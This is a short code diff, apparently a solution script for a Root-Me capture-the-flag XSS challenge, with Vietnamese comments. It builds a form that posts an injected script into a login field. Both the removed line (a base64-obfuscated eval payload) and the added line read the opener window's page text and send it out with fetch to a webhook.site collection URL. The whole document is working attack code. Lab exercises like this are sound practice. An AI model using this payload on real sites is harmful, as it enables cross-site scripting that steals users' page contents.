@@ -2,14 +2,14 @@
     const form = document.createElement('form');
     form.method = 'POST';
     form.action = 'http://challenge01.root-me.org:58003/login';
-    form.target = "_blank"; 
+    form.target = '_self'; 
 
     const input = document.createElement('input');
     input.name = 'username';
     
-    // Payload này chỉ sử dụng hàm eval và atob, không chứa dấu ngoặc nhọn { } 
-    // giúp tránh hoàn toàn lỗi SyntaxError khi render
-    input.value = "<script>eval(atob('dmFyIHMgPSB3aW5kb3cub3BlbmVyID8gd2luZG93Lm9wZW5lci5kb2N1bWVudC5ib2R5LmlubmVyVGV4dCA6ICJubyBvcGVuZXIiO2ZldGNoKCJodHRwczovL3dlaWJob29rLnNpdGUvMTIyY2Q4ODMtMDQwMi00N2E4LWEyNjQtZDEwYzE3MWMwMWNlP2Q9IiArIGJ0b2EocykpOw=='))<\/script>";
+    // Payload tối giản, sử dụng dấu phẩy thay vì dấu chấm phẩy và không dùng ngoặc nhọn nếu có thể
+    // Ở đây ta dùng try/catch trên 1 dòng duy nhất.
+    input.value = `<script>try{fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(window.opener.document.body.innerText))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;
 
     form.appendChild(input);
     document.body.appendChild(form);
